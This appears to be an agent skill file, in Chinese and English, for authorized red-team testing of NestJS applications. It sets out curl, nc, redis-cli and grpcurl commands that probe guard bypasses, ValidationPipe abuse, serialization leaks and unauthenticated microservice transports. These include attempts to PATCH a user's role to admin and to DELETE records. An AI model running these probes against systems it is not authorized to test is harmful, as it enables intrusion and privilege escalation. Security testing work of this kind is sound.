---
name: hunt-nestjs
description: "狩猎 NestJS 特有漏洞：守卫绕过、装饰器缺口与微服务认证漂移。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  tags: [redteam, nestjs, TypeScript, decorator, guard, microservice, GraphQL]
  category: redteam
  related_skills:
    - hunt-graphql
    - hunt-api-misconfig
    - hunt-idor
    - hunt-write-gap
---

# NestJS 安全狩猎

狩猎 NestJS 特有漏洞，包括：通过装饰器栈缺口绕过守卫、全局/控制器/方法守卫之间 Reflector 元数据不匹配、ValidationPipe 白名单与 transform 利用，以及微服务传输认证漂移。NestJS 的架构模式——装饰器、依赖注入、模块系统、多传输支持——在 HTTP、WebSocket 和 RPC 传输上创造了独特的攻击面。

## When to Use

- 目标使用 NestJS（表现为 `x-powered-by: NestJS` 或错误信息中的 TypeScript 装饰器模式）。
- GraphQL 端点与 REST API 并存。
- 配置了微服务传输（TCP、Redis、NATS、MQTT、gRPC）。
- Swagger/OpenAPI 文档暴露在 `/api` 或 `/api-json`。
- CRUD 端点遵循可预测的 NestJS 命名约定。

## Prerequisites

- 针对目标的明确授权、目标边界与速率限制。
- 工具：`curl`、`grpcurl`、`jq`、`redis-cli`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在命令执行前立即获取明确确认。

## How to Run

```bash
# NestJS fingerprinting
curl --max-time 30 --connect-timeout 10 -skI "https://target.com/api" | grep -iE "x-powered-by|server"
# Look for: x-powered-by: NestJS

# Swagger docs
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api" -w "%{http_code}\n" -o /dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api-json" | jq '.paths | keys[]' 2>/dev/null
```

## 快速检测

```bash
# NestJS fingerprinting
curl --max-time 30 --connect-timeout 10 -skI "https://target.com/api" | grep -iE "x-powered-by|server"
# Look for: x-powered-by: NestJS

# Swagger docs
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api" -w "%{http_code}\n" -o /dev/null
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api-json" | jq '.paths | keys[]' 2>/dev/null
```

## Procedure

### 阶段 1 —— 通过装饰器栈缺口绕过守卫

```bash
# NestJS guard resolution: global → controller → method
# A @Public() or @SkipAuth() on one method doesn't affect others
# BUT: route parameter confusion can bypass guards

# Test all HTTP methods on guarded endpoints
for method in GET POST PUT PATCH DELETE OPTIONS; do
  curl --max-time 30 --connect-timeout 10 -sk -X "$method" "https://target.com/api/admin/users" \
    -w "$method — %{http_code}\n" -o /dev/null
done

# Controller-level guard with method-level override
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/health"     # may be @Public
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/admin/config"     # may be @Public
```

### 阶段 2 —— Reflector 元数据不匹配

```bash
# Global guard checks @Roles() metadata
# But controller-level guard may use different metadata key
# This creates gaps where global guard has no metadata to check → passes

# Test endpoints with different role requirements
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/users" -H "Authorization: Bearer TOKEN" \
  -w "GET users — %{http_code}\n" -o /dev/null

curl --max-time 30 --connect-timeout 10 -sk -X DELETE "https://target.com/api/users/1" -H "Authorization: Bearer TOKEN" \
  -w "DELETE user — %{http_code}\n" -o /dev/null

# Custom parameter decorators may bypass guard checks
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/users?userId=VICTIM_ID" \
  -H "Authorization: Bearer TOKEN" \
  -w "param decorator — %{http_code}\n" -o /dev/null
```

### 阶段 3 —— ValidationPipe 利用

```bash
# ValidationPipe with whitelist: true strips unknown fields
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","isAdmin":true}'   # isAdmin stripped if not in DTO

# BUT: transform: true enables implicit type conversion
# Primitive types auto-converted → string "true" → boolean true
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","isActive":"true"}'  # string coerced to boolean

# ValidationPipe with skipMissingProperties: true
# PATCH with only the fields you want to change — skips validation of missing fields
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/users/me" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'  # only role updated, no other validation
```

### 阶段 4 —— 序列化泄露

```bash
# ClassSerializerInterceptor absence — returns full entity
# With interceptor: returns only @Expose() fields
# Without interceptor: returns ALL entity fields including password hash

curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/users/1" | jq 'keys' 2>/dev/null
# Look for: password, passwordHash, secretKey, internalNotes, etc.

# @Exclude() on entity but interceptor not applied globally
# → controller without interceptor leaks excluded fields
```

### 阶段 5 —— 微服务传输认证漂移

```bash
# NestJS microservices support multiple transports
# Auth enforced on HTTP may be absent on TCP/Redis/NATS

# TCP transport (default port 3000)
echo '{"pattern":"getUser","data":{"id":1}}' | nc target.com 3000

# Redis transport — check if Redis is exposed
redis-cli -h target.com PUBLISH "get_user" '{"id":1}'

# gRPC transport — check reflection
grpcurl -plaintext target.com:5000 list

# @MessagePattern without @UseGuards()
# → microservice handler has no authentication at all
```

### 阶段 6 —— 模块边界泄露

```bash
# @Global() modules export providers to all other modules
# If AuthModule is @Global(), token validation available everywhere
# BUT: some modules may import AuthModule manually and use a WEAKER guard

# CRUD generator auto-endpoints
# nestjsx/crud creates standard CRUD without explicit @UseGuards()
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/users"           # GET all
curl --max-time 30 --connect-timeout 10 -sk "https://target.com/api/users/1"         # GET one
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/users"   # CREATE
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/users/1" # UPDATE
curl --max-time 30 --connect-timeout 10 -sk -X DELETE "https://target.com/api/users/1" # DELETE
```

## Pitfalls

- **NestJS Swagger 模块可能无视认证暴露所有端点。** 始终检查 `/api-json` 中隐藏的端点。
- **`@Public()` 装饰器是框架特定的（并非 NestJS 内置）。** 不同项目使用 `@SkipAuth()`、`@NoAuth()` 或 `@AllowAnonymous()`。
- **微服务传输常常运行在内部端口上。** 如有可能，从目标网络内部进行测试。
- **`@Res({ passthrough: true })` 会绕过标准响应管线。** 响应头和状态码可被注入。

## Verification

1. 控制器级别带有 `@UseGuards(AuthGuard)` 的端点，在方法级别接受未认证请求。
2. 序列化拦截器缺失导致内部字段泄露（密码哈希、内部备注、令牌）。
3. 微服务处理器在没有任何认证的情况下处理请求，而等价的 HTTP 接口要求 JWT。
4. CRUD 自动端点在没有明确授权的情况下暴露创建/更新/删除操作。

---

## 相关技能

- **`hunt-graphql`** —— 使用 @nestjs/graphql 装饰器的 NestJS GraphQL 端点。
- **`hunt-api-misconfig`** —— 更广泛的 API 错误配置，包括守卫与管道缺口。
- **`hunt-idor`** —— 通过 NestJS 参数装饰器实现的对象级授权。
- **`hunt-write-gap`** —— 接受写入但无读取授权的 NestJS PATCH 端点。
